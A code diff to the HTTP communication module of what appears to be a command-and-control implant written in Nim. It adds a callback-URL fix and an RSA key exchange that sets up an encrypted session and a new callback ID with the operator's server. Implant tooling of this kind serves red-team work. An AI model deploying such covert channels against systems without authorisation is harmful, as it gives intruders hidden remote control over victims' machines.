@@ -1,6 +1,7 @@
-import std/[httpclient, base64, strutils, json]
+import std/[httpclient, base64, strutils, json, random]
 import ../config
 import ../utils/crypto
+import ../utils/rsa
 
 type
   HttpProfile* = ref object
@@ -53,13 +54,19 @@ proc newHttpProfile*(): HttpProfile =
 proc buildUrl(profile: HttpProfile): string =
   ## Build the full callback URL
   var host = profile.config.callbackHost
-  # Strip any existing scheme from host
-  if host.startsWith("http://"):
-    host = host[7..^1]
-  elif host.startsWith("https://"):
-    host = host[8..^1]
+  var scheme = ""
   
-  let scheme = if profile.config.callbackPort == "443": "https" else: "http"
+  # Detect and strip any existing scheme from host
+  if host.startsWith("https://"):
+    scheme = "https"
+    host = host[8..^1]
+  elif host.startsWith("http://"):
+    scheme = "http"
+    host = host[7..^1]
+  else:
+    # No scheme provided, determine from port
+    scheme = if profile.config.callbackPort == "443": "https" else: "http"
+  
   result = scheme & "://" & host & ":" & 
            profile.config.callbackPort & "/" & profile.config.postUri
 
@@ -174,19 +181,124 @@ proc hasAesKey*(profile: HttpProfile): bool =
   ## Check if AES key is set
   result = profile.aesKey.len > 0
 
-proc performKeyExchange*(profile: var HttpProfile): bool =
+proc performKeyExchange*(profile: var HttpProfile): tuple[success: bool, newUuid: string] =
   ## Perform RSA key exchange to establish AES session key
+  ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
   ## If encrypted exchange is not required, use the static PSK
   
   # If no encrypted exchange needed, just use the static PSK
   if not profile.config.encryptedExchange:
     if profile.config.debug:
-      echo "[DEBUG] No key exchange required"
+      echo "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
     # Don't set key yet - will be set after successful checkin
-    return true
+    return (true, "")
   
-  # TODO: Implement full RSA key exchange
-  # For now, fall back to using static PSK after checkin
+  # Check if RSA is available (requires OpenSSL)
+  if not isRsaAvailable():
+    if profile.config.debug:
+      echo "[DEBUG] RSA key exchange not available: OpenSSL not found"
+      echo "[DEBUG] Use AESPSK (pre-shared key) for encryption instead"
+      echo "[DEBUG] Communication will be unencrypted (Base64 only)"
+    return (true, "")  # Don't fail, just skip key exchange
+  
   if profile.config.debug:
-    echo "[DEBUG] RSA key exchange not yet implemented"
-  return true
+    echo "[DEBUG] === PERFORMING RSA KEY EXCHANGE ==="
+  
+  try:
+    # Generate RSA 4096-bit key pair
+    if profile.config.debug:
+      echo "[DEBUG] Generating RSA 4096-bit key pair..."
+    
+    var rsaKey = generateRsaKeyPair(4096)
+    
+    if not rsaKey.available:
+      if profile.config.debug:
+        echo "[DEBUG] RSA key generation failed: OpenSSL error"
+      return (false, "")
+    
+    if profile.config.debug:
+      echo "[DEBUG] RSA key generated, public key length: ", rsaKey.publicKeyPem.len, " bytes"
+    
+    # Generate random 20-character session ID
+    randomize()
+    var sessionId = newString(20)
+    for i in 0..19:
+      sessionId[i] = char(rand(25) + ord('a'))  # Random lowercase letters
+    
+    if profile.config.debug:
+      echo "[DEBUG] Session ID: ", sessionId
+    
+    # Build staging_rsa message
+    let stagingMsg = %*{
+      "action": "staging_rsa",
+      "pub_key": encode(rsaKey.publicKeyPem),
+      "session_id": sessionId
+    }
+    
+    let stagingStr = $stagingMsg
+    
+    if profile.config.debug:
+      echo "[DEBUG] Sending staging_rsa request..."
+    
+    # Send with payload UUID (like oopsie does) - base64(UUID + json)
+    # Server will respond with base64(UUID + response_json)
+    let response = profile.send(stagingStr, profile.config.uuid)
+    
+    if response.len == 0:
+      if profile.config.debug:
+        echo "[DEBUG] Key exchange failed: empty response"
+      freeRsaKeyPair(rsaKey)
+      return (false, "")
+    
+    if profile.config.debug:
+      echo "[DEBUG] Received key exchange response: ", response.len, " bytes"
+    
+    # Parse response
+    let respJson = parseJson(response)
+    
+    if not respJson.hasKey("session_key") or not respJson.hasKey("uuid"):
+      if profile.config.debug:
+        echo "[DEBUG] Key exchange failed: missing session_key or uuid in response"
+      freeRsaKeyPair(rsaKey)
+      return (false, "")
+    
+    let encryptedSessionKey = decode(respJson["session_key"].getStr())
+    let newUuid = respJson["uuid"].getStr()
+    
+    if profile.config.debug:
+      echo "[DEBUG] Encrypted session key length: ", encryptedSessionKey.len, " bytes"
+      echo "[DEBUG] New callback UUID: ", newUuid
+    
+    # Decrypt session key with RSA private key
+    let encryptedBytes = cast[seq[byte]](encryptedSessionKey)
+    let decryptedKey = rsaPrivateDecrypt(rsaKey, encryptedBytes)
+    
+    if decryptedKey.len == 0:
+      if profile.config.debug:
+        echo "[DEBUG] Key exchange failed: RSA decryption failed"
+      freeRsaKeyPair(rsaKey)
+      return (false, "")
+    
+    # Truncate to 32 bytes (AES-256 key)
+    var aesKey = decryptedKey
+    if aesKey.len > 32:
+      aesKey.setLen(32)
+    
+    if profile.config.debug:
+      echo "[DEBUG] Decrypted AES key length: ", aesKey.len, " bytes"
+    
+    # Set the AES key
+    profile.setAesKey(aesKey)
+    
+    # Clean up RSA key
+    freeRsaKeyPair(rsaKey)
+    
+    if profile.config.debug:
+      echo "[DEBUG] RSA key exchange completed successfully"
+    
+    return (true, newUuid)
+  
+  except:
+    if profile.config.debug:
+      echo "[DEBUG] Key exchange exception: ", getCurrentExceptionMsg()
+    return (false, "")
